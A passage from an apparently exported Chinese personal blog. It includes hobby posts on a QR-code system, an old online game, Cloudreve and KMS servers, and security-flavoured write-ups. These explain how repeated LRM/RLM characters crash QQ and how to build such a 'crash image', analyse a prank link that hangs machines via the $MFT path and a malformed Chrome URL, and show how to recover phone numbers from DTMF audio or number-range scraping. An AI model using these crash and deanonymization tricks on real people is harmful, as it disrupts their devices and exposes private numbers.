前阵子无聊写了个简单的活码系统谁知道竟然好多人要买（雾草….我瞎写的啊…）。无意间又看到了老司机写的。人家界面又好看，功能又齐全，真的很厉害。于是准备把自己的那个自行车改装下，不说改的多好起码得能看得过去。 代码先不敲，写个稿子记下思路（要干活先挖坑）。 首先是功能： 1、多用户（系统有多个用户）&nbsp; &nbsp; ★★☆☆☆&nbsp; 取消 2、计次切换&nbsp; &nbsp;&nbsp; ★★★☆☆ 已完成 3、随机切换&nbsp; &nbsp; ★★★★☆ 4、更新图片输出方式（原来那个太蠢了）&nbsp; &nbsp; ★★★★★ 5、一键安装功能&nbsp; &nbsp; ★☆☆☆☆ 6、安全加固（管他呢看心情加固）&nbsp; &nbsp; &nbsp;★☆☆☆☆ 7、界面美化（不用bs改用layui）&nbsp; &nbsp;★★★★★ 已完成 8、新的上传&nbsp; &nbsp; ★★★★☆ 已完成 数据库结构： 1、二维码信息表 &nbsp; &nbsp; ①二维码名称 &nbsp; &nbsp; ②二维码被访问次数（暂定） &nbsp; &nbsp; ③二维码所属用户 &nbsp; &nbsp; ④二维码ID 2、用户表 &nbsp; &nbsp; ①用户名 &nbsp; &nbsp; ②密码 &nbsp;&nbsp;&nbsp;&nbsp;③用户ID 总体思路： 用户创建【二维码ID】，类库对其生成二维码。 扫描后访问查询页。查询同 【二维码ID】and&nbsp; 【二维码所属用户】 下所有条目的【二维码名称】。 并且记录【二维码被访问次数（暂定）】 大概总体就这吧 date:2021项目已弃坑"},{"title":"寻仙问道，梦回少年","date":"2018-08-26T08:22:00.000Z","url":"/2018/08/26/%E5%AF%BB%E4%BB%99%E9%97%AE%E9%81%93%EF%BC%8C%E6%A2%A6%E5%9B%9E%E5%B0%91%E5%B9%B4/","categories":[["undefined",""]],"content":"两天前老弟突然对我说想玩一个游戏，还贼兮兮的告诉我特别古老。还在想FC游戏时这家伙就说漏了嘴–《问道》。 是啊，《问道》，挺古老的。想想第一次玩的时候才小学，那时才刚刚接触电脑。在小伙伴的诱惑下偷偷去黑网吧玩的样子历历在目。 《问道》是一款回合制游戏，以修仙为背景。第一次接触它时好像才三年级。我还清晰的记得当时的第一个账号是一个叫祝元哲的小伙伴给的（这货现在估计都快有孩子了吧）。账号是e9999999999999（整整13个9）密码123456，在逐鹿中原区。不过这个号现在已经登不上去了。 凭着一股子脑热重新下载了这款游戏（竟然还活着）。游戏官网赫然写着十二周年纪念，欢迎老玩家回归。可是试了好几个号里面的角色都消失了，可能已经被清数据了吧。用着老号创建新角色再走一遍十二年前的路。 （这么多年图标都不舍得换） 登录账号，登录界面不知道换了几次了 打开地图揽仙镇也“装修”了很多遍，就连“新”NPC花姑子都变成老油条了。 遥想当年奔波在揽仙镇上，满十级后去天墉城时激动的心情、在官道上遇到一位大佬带着桃精我竟然还不认识、区里最高等级高达500、那时还没有道行在这一说、大家一个多月才升到10级…… 十二年回首多少玩家来来去去。这么多年间回归了多次，最终还是弃坑。道友啊，我又回来了，大家已经位列仙班了吗？ 玩了两天，终于还是没有玩出当年的感觉。仔细思考了一下，《问道》现在的样子和那些页游有什么区别？（也是到处都有充值的活动广告，也是卖情怀） 写到这里心里很乱，也不知道自己写了点什么。罢了罢了，过去的就该过去。 寻仙问道，梦回少年 道友，你还在吗"},{"title":"一个简易授权demo","date":"2018-08-20T06:35:00.000Z","url":"/2018/08/20/%E4%B8%80%E4%B8%AA%E7%AE%80%E6%98%93%E6%8E%88%E6%9D%83demo/","categories":[["undefined",""]],"content":"在页面中引用，比如： 感谢@慕若曦的指点"},{"title":"php笔记---简单的多层网页内容提取","date":"2018-08-20T06:15:00.000Z","url":"/2018/08/20/php%E7%AC%94%E8%AE%B0---%E7%AE%80%E5%8D%95%E7%9A%84%E5%A4%9A%E5%B1%82%E7%BD%91%E9%A1%B5%E5%86%85%E5%AE%B9%E6%8F%90%E5%8F%96/","categories":[["undefined",""]],"content":"举例 求手机号177xxxx6832完整号码 以河南驻马店为例，找出相应号段&nbsp; 177号段 单号段网页内容 开始程序 "},{"title":"一张渗透思维导图","date":"2018-08-06T10:07:00.000Z","url":"/2018/08/06/%E4%B8%80%E5%BC%A0%E6%B8%97%E9%80%8F%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/","categories":[["undefined",""]],"content":" 右击保存到本地可放大查看"},{"title":"一个物联网安全的百科书","date":"2018-08-06T10:04:00.000Z","url":"/2018/08/06/%E6%8E%A8%E8%8D%90%E4%B8%80%E4%B8%AA%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E7%99%BE%E7%A7%91/","categories":[["undefined",""]],"content":"如题，一个物联网安全的百科书 由伏宸安全实验发起的一个开源图书项目，目前属于测试版本，很多章节尚未完成，收录在日常研究过程中，总结的零散知识和心得经验，今后会不断完善内容，形成系统化的知识结构 物联网安全百科"},{"title":"搭建一个私人网盘--cloudreve","date":"2018-08-05T13:48:00.000Z","url":"/2018/08/05/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%A7%81%E4%BA%BA%E7%BD%91%E7%9B%98--cloudreve/","categories":[["undefined",""]],"content":"万恶的度盘限速实在厉害，用了插件突破结果账号被限速了。 今天给大家推荐一款私人云盘cloudreve官网 优点云存储填写简单信息即可快速对接七牛、又拍云、阿里云OSS、AWS S3，当然你也可以选择将文件存放在本地。 多用户你可以将Cloudreve作为私有云使用，Cloudreve强大的用户系统也可作为公有云平台使用。 上传策略不同用户组可绑定不同上传策略，并在多个上传策略间快速切换，充分利用存储资源。 在线预览支持图片、视频、音频、Office文档在线预览；文本文件、Markdown文件在线编辑。 文件分享用户可以创建私有或公有分享链接，快速分享文件、目录给好友。 WebDAV支持你可以将网盘映射到本地管理，或者使用其他支持WebDAV协议的文件管理器，实现无缝跨平台。 响应式布局全站响应式布局，移动端也能拥有良好的使用体验 文件上传支持大文件分片上传、断点续传、批量上传、拖拽上传。 易于部署使用PHP + MySQL架构，简单5分钟即可成功部署您的专属云盘。 以上是我从官网复制过来的（逃~ 安装步骤：有两种安装方式 一、通过Composer安装 安装Composer 2. 使用Composer安装Cloudreve #安装开发版 $ composer create-project hfo4/cloudreve:dev-master #出现如下提示表示安装完成Congratulations! Cloudreve has been installed successfully. Here’s some informatioin about yor Cloudreve:Homepage:  Panel:  username: &#x61;&#100;&#109;&#105;&#x6e;&#64;&#99;&#x6c;&#x6f;&#117;&#x64;&#x72;&#101;&#x76;&#101;&#46;&#111;&#114;&#x67;Default password: admin [v_blue]runtime目录需要写入权限，如果你使用本地存储，public 目录也需要有写入权限[/v_blue] 常规安装（虚拟主机安装）在官网下载程序包并解压到目录官方下载地址： 将根目录下的mysql.sql到入到你的数据库，编辑application/database_sample.php文件，填写数据库信息，并重命名为database.php正常访问即可后台：abc.com/admin/默认账号: &#x61;&#x64;&#x6d;&#105;&#110;&#x40;&#99;&#108;&#111;&#x75;&#100;&#x72;&#101;&#x76;&#x65;&#46;&#x6f;&#x72;&#x67;默认密码: admin 登录后可在管理面板中添加管理员 如果想作为私人网盘使用也可以在管理面板中设置 提示：要记得设置用户空间大小，默认为1G要记得设置文本编辑大小限制，不然大点的文本会不能编辑360急速浏览器自带下载功能下载时可能会异常离线下载功能需要aria2支持。详细配置教程点击此处官方项目地址：点击此处"},{"title":"快速搭建一个KMS服务器","date":"2018-08-04T08:54:00.000Z","url":"/2018/08/04/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AAKMS%E6%9C%8D%E5%8A%A1%E5%99%A8/","categories":[["undefined",""]],"content":" KMS用来激活 VOL 版本的 Windows 和 Office。经常能在网上看到有人提供的 KMS 服务器地址，那么你有没有想过自己也来搞一个这样的服务呢？最近看到了大佬的一键脚本点击查看于是写篇文章水一下。以祭我这长了蜘蛛网的博客。 root登录服务器复制粘贴以下命令并回车 安装完成后执行以下命令查看端口状态（一般都没啥问题） 本脚本安装完成后，会将 KMS 服务加入开机自启动 查看运行状态 使用方法win管理员身份运行cmd或新建bat文件输入以下内容 /d \"%SystemRoot%\\system32\" office同上，命令如下 /d \"%ProgramFiles%\\Microsoft Office\\Office15\" 常用命令 提示：KMS方式激活是有时间限制的，本文章仅供娱乐"},{"title":"php笔记--登陆验证和curl","date":"2018-07-14T11:44:00.000Z","url":"/2018/07/14/php%E7%AC%94%E8%AE%B0--%E7%99%BB%E9%99%86%E9%AA%8C%E8%AF%81%E5%92%8Ccurl/","categories":[["undefined",""]],"content":"登录验证 "},{"title":"又见卡死图，竟然一个“小黑点”就能干掉QQ？（首发FREEBUF）","date":"2018-05-17T07:46:00.000Z","url":"/2018/05/17/%E5%8F%88%E8%A7%81%E5%8D%A1%E6%AD%BB%E5%9B%BE%EF%BC%8C%E7%AB%9F%E7%84%B6%E4%B8%80%E4%B8%AA%E2%80%9C%E5%B0%8F%E9%BB%91%E7%82%B9%E2%80%9D%E5%B0%B1%E8%83%BD%E5%B9%B2%E6%8E%89QQ%EF%BC%9F/","categories":[["undefined",""]],"content":"前一阵子QQ群里流行了一个东西，一段话加上一个黑点（表情），点击之后QQ就会卡死。 当时只觉得很好玩，没多久就又见了一次。 既然又看到了就一定要好好看看了。 刚开始遇到这个时第一反应是曾经看过的文章《一张GIF引发的微信崩溃》，所以第一反应也是扔进010Editor看看，然而并没有什么异常的地方。就在这时无意间看到了图片的名字，觉得不一般，后想了想会不会是和“十五个句号”一样触发了什么东西。 表情图片名称： 最后看了看实在想不到有什么异常的。虽然名字奇怪了点但一般这种图片不都是这样吗。更何况都有后缀名结尾，应该是翻不起什么浪的。这一会的我怕是已经有点草木皆兵了。 如果不是图片的话那么就是文字的原因喽？文字复制~ 浏览器顺利爆炸： 地址栏里好像有什么东西。经过精简最后拿到了：%E2%80%8E 浏览器中重复出现这个东西： 到这里真相就差不多了，N多个%E2%80%8E循环出现。那么这个%E2%80%8E到底是什么呢个？经过查阅资料这东西叫ZERO-WIDTH SPACE，顾名思义0宽度，所以这东西看不见。那么既然是“隐形”的那它隐藏了什么？编码转换后得到如下： 我们可以看出这三个起来作用“&amp;#8206;&amp;#8207;&amp;#8235;” &amp;#8206;LRM‎ 从左到右标记 &amp;#8207;RLM从右向左标记 &amp;#8235;RLE‫ 开始从右向左嵌入 到这里就可以看出了，其实&amp;#8235也是可以去掉的，真正生效的是LRM和RLM。多个左右标记循环出现，当用户去指定一个位置时会因为“反复横跳”导致当前程序崩溃。而原来的黑点以及国旗只是给用户错觉，让人以为是它的原因。而“&amp;#8206;&amp;#8207;&amp;#8235;”重复出现应该也只是制造者为了尽量卡死用户而特意重复书写，并不是因为某种原因而生成的。理论上来说这个对所有触屏手机和其运行的软件能够生效。（如果点一次没卡可以多作几次，iOS未测试）。 那么既然知道了原理我们也可以制作一个自己的“卡死图”。 然后将（&amp;#8206;&amp;#8207;）*N由unicode转换为ASCII，得到的即为只显示文字或图片的“卡死图”。 原聊天记录中的代码（未保存图片）。 链接:  密码: v5qt 查阅资料 《一个特殊的字符？（%E2%80%8B）》 《[BUG随想录] 看不见的分隔符:Zero-width space》 emmmmm….虽然是自己的东西但还是放个原文链接吧 "},{"title":"怎么通过声音分析手机号码","date":"2017-07-21T12:02:00.000Z","url":"/2017/07/21/%E6%80%8E%E4%B9%88%E9%80%9A%E8%BF%87%E5%A3%B0%E9%9F%B3%E5%88%86%E6%9E%90%E6%89%8B%E6%9C%BA%E5%8F%B7%E7%A0%81/","categories":[["undefined",""]],"content":"很久以前看到过个新闻，说是某大学生通过一段视频里的声音分析出了周鸿祎的手机号。一直以来都觉得非常酷炫，最近突然想起来于是动手复现一下。 在网上虽然找了很多文章但大多都是各种转载，丢失了很多信息，经过几天的整理现在终于可以写这篇文章了。 首先要玩音频分析要知道一个东西。DTMF，来段度娘百科。双音多频信号（DTMF），电话系统中电话机与交换机之间的一种用户信令，通常用于发送被叫号码。在使用双音多频信号之前，电话系统中使用一连串的断续脉冲来传送被叫号码，称为脉冲拨号。脉冲拨号需要电信局中的操作员手工完成长途接续(早期方法，很老很古董)。双音多频信号是贝尔实验室发明的，其目的是为了自动完成长途呼叫。双音多频的拨号键盘是4×4的矩阵，每一行代表一个低频，每一列代表一个高频。每按一个键就发送一个高频和低频的正弦信号组合，比如’1’相当于697和1209赫兹(Hz)。交换机可以解码这些频率组合并确定所对应的按键。 也就是说通过两个声音频率可以确定一个键盘位置。有人说如果熟悉的话是可以通过人类的肉体（//▽//）判断出来，但是有时候在一些特殊情况下人类是无法完成的。 撒~，下面开始过程复现 首先通过声音收集设备录制音频，一般为mp3和wav格式然后导入到任意一种音频分析软件，这里我用了Adobe Soundbooth CS5 导入后我们的重点在下方那些东西里面。最初导入可能会有背景噪音和其他杂音，所以我适当的编辑了下音频。我们所需要的是图中的亮点，每个竖轴上有两个亮点。这些亮点就是DTMF中所需要的两个音频。 通过对照右边的声音频率，与DTMF表进行对照。我们就可以得到详细数字。最后我们就可以得到音频中的号码了。（图中的是我的手机号哦，妹子们千万不要骚扰我啊）"},{"title":"玩转Wallpaper Engine，不同的炫酷姿势","date":"2017-07-19T14:21:00.000Z","url":"/2017/07/19/%E7%8E%A9%E8%BD%ACWallpaper%20Engine%EF%BC%8C%E4%B8%8D%E5%90%8C%E7%9A%84%E7%82%AB%E9%85%B7%E5%A7%BF%E5%8A%BF/","categories":[["undefined",""]],"content":"鼓捣过动态壁纸的小伙伴们大概都知道Wallpaper Engine这个玩意，steam售价18RMB的有钱人玩具。为什么说是有钱人的玩意呢？因为在XP时代（后来的版本我没研究过）我记得就可以通过系统自身功能达到动态桌面的实现，所以我觉得并不用花那些钱去搞这个。嘛~扯远了，今天给大家带来一个炫酷的Wallpaper Engine玩法。 拿到Wallpaper Engine大家第一反应是加载创意工坊的项目文件，然而Wallpaper Engine的功能不止如此。创意工坊内的文件基本是视频文件，而Wallpaper Engine还支持Flash和网页文件。视频文件仅仅是用来播放，而后者却有交互性。那么我们通过后者的交互性可以达到一些炫酷的效果。 首先说FLASH过于复杂，如果用它来作为桌面那么对机器的消耗比较大，为了美观牺牲性能对大家来说得不偿失。所以我们采用网页形式，网页可以通过js实现交互功能，而已js作为一个轻量级的语言运行对你机器几乎不存在负荷。另外因为没有调用浏览器所以几乎没有消耗性能。 上效果图：&nbsp;  &nbsp; 网页可以下载到本地，通过本地协议访问，这样可以不用联网即可加载桌面。 Wallpaper Engine我记得有破解版，想玩玩的可以找下玩玩，不过以后记得支持正版记得去补票哦 几个有意思的网页都是从其他地方收集来的，并非本人所写。若需要这些东西可以加群问我偷偷要哦。 &nbsp;"},{"title":"分析一个“炸弹”恶意链接","date":"2017-07-19T11:20:00.000Z","url":"/2017/07/19/%E5%88%86%E6%9E%90%E4%B8%80%E4%B8%AA%E2%80%9C%E7%82%B8%E5%BC%B9%E2%80%9D%E6%81%B6%E6%84%8F%E9%93%BE%E6%8E%A5/","categories":[["undefined",""]],"content":"事件起因这其实是一件很偶然的事情，前几天在某大佬群里看大佬装逼。突然一个平日不怎么冒泡的群友发了一条链接。本着“这群里都是好人 ”的想法我就天真的点了进去……这一点可闹大了。电脑猛地变卡直至完全不能动弹，无奈的我只能重启，重启过程中突然想起刚刚做的期末作业还没有保存 …… 正文重启完成之后觉得这个链接挺好玩的，于是决定把它“顺“ 下来，看看它到底有什么神通。 如上图所示，出人预料的简单,只有七个文件（我还以为会有多么复杂) 六个html和一个css。其中css文件和2.html没有什么意义，纯属装饰，文章中不再讨论。 本来想去度娘下看看有什么头绪没有，半路上想起这么好玩的东西freebuf上怎么可能没有呢？于是来到网站进行搜索，关键词：“崩溃”、“浏览器”。找到了这篇文章： 《AwSnap：让全版本（Windows、iOS、Android）Chrome浏览器崩溃的有趣漏洞》 查看文件代码，果然在cr.html里面发现了这篇文章中提到的畸形URL 这下就明白了，作者通过过长或者畸形URL触发浏览器bug导致用户系统卡死 那么问题来了，只是让我跪了的话只要这个cr.html就够了啊，那个ie.html 是什么？难道是针对ie的？这么6？打开看看。 这是什么啊？有点懵逼。等等……$MFT有点眼熟，赶紧返回首页找了找最终在侧边的快讯中找到了某条信息 经过度娘，围观大佬们的文章最终了解了这个东西的相关信息（甚至还找到了这段代码最初的出处）。 当用户访问X:$MFT\\下的任意文件时系统会被卡死，而且目前微软还没有发布补丁（ X 为ntfs盘符）。这个bug的厉害之处在于它太容易被触发了。不用什么高级的操作，仅仅只是浏览器正常调用就足够了。 例如： 在网页里引用了一个让你能爆炸的目录，然后触发漏洞炸得你一脸懵逼。又针对chrome又利用ie ，这人真是可怕啊。对于一般网民来说用的浏览器无非也就360XX浏览器、或者QQ浏览器再或者等等等等吧。总之国内市面上普通网民所使用的浏览器哪个和 chrome扯不上关系，再退一步现在还用着IE的人也并不少。所以说这个链接几乎能玩死大多数网民并不是吹的。 分析完这些东西以后发现了一个问题，既然作者想整人那么绝对不可能把两个文件的链接都做出来然后发送，每个文件只对应了特定的浏览器才能触发。如果链接发出去了对方浏览器不是相应的那个那岂不是装逼失败？所以说一定有一个判断页面，然后根据不同的浏览器跳转到不同的文件上去。于是打开了zz.html （zz一定是中转的简称…..） 这个…这个判断有点猎奇啊…. 最终经过度娘查到了这段代码的出处。代码var ie = !-[1,];在ie9之前曾被称为世界上最短的判断代码。 它利用了IE与标准浏览器在处理数组的toString方法的差异做成的。在这段代码执行时会先调用数组的 toString()方法 ，执行[1,].toString()在 IE6,7,8中将会得到”1,”。然后表达式就变为!-”1,”。再尝试把 “1，”转换成数值类型得到NaN ,再对NaN 取负得到值仍为NaN。最后执行!NaN返回true 。代码 var ie = !-[1,]; 其实等价于 var ie = !(-Number([1,].toString())); 在IE6\\7\\8中值为true。 因为IE6/7/8都不会忽略[1,].ToString()这个bug，即得到的是”1,”；而-Number([1,].toString())即为-Number(“1,”)得到的结果是NaN；然后!(-Number([1,].toString()))即为!(NaN)即得到true。一切的前提是IE6/7/8都有[1,].ToString()=&gt;”1,”这个bug，而其它浏览器则是[1,].ToString()=&gt;”1″ 引用资料：《全世界最短的IE浏览器判断代码》 分析当用户点击这个链接会打开index.html，这个页面是欢迎界面（大概没什么意义吧）。下一步用户继续点击，页面跳转到判断页。判断页通过var ie = !-[1,];这个极短的代码判断用户浏览器类型并跳转到相对应的“爆破”页面。如果是IE浏览器就跳转到ie.html，页面通过调用$MFT目录下的123.jpg文件触发bug，用户系统被卡死。如果是chrome浏览器或者chrome内核的浏览器则会跳转到cr.html，通过畸形URL触发浏览器bug导致内存狂飙直至系统卡死。如果你的浏览器没有触发bug你将可以看到“hello world”。 这个恶搞链接的作者技术可能不是怎么高，但他的见识却不短。几个简单的步骤中运用了的都是常人不会注意到或者根本想不到的东西。（$MFT出现在今年五月份，chrome崩溃那个又是出现在2015年，判断手法又来自于2010年） 结尾经过自己多次作死得出几个结果，也得出了一些疑问。经测试市面上多数浏览器都会跪在cr.html面前，然而360 急速浏览器在急速模式下时不会受到影响，当切换到兼容模式时会触发漏洞导致内存狂飙。但是某老司机却告诉我将兼容模式其实是还是ie，那么是ie 又为什么会触发chrome的漏洞呢？求大佬解答。另外在一些文章中写到这个东西可以被用在XSS 中，那不是酸爽无比？ 这篇文章本来发表在FREEBUF，博客实在没啥可写的先弄过来充数。嘛~，转载自己的文章也不算侵权不是？ &nbsp; 附上大佬对文章最后疑问的解释： 兼容模式只是ie方式渲染，适配类似于ActiveX插件的页面，最终毕竟还是在chrome的壳子里输出，所以畸形地址照样触发。"}]